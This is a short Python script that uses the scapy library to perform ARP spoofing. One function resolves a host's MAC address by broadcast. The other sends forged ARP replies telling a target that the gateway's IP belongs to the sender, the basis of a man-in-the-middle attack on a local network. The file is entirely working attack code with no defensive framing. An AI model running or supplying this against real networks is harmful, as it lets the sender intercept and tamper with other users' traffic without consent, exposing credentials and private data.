#/usr/bin/env python
from scapy.layers.l2 import ARP, Ether
import scapy.all as scapy


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast / arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # Send packet to Client (target_ip), telling it I have the Router (gateway) MAC Address.
    # ARP fields: op=2 (ARP Response). pdst=[TARGET_IP]. hwdst=[TARGET_MAC].
    # psrc=[SOURCE_IP](GATEWAY_IP)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)
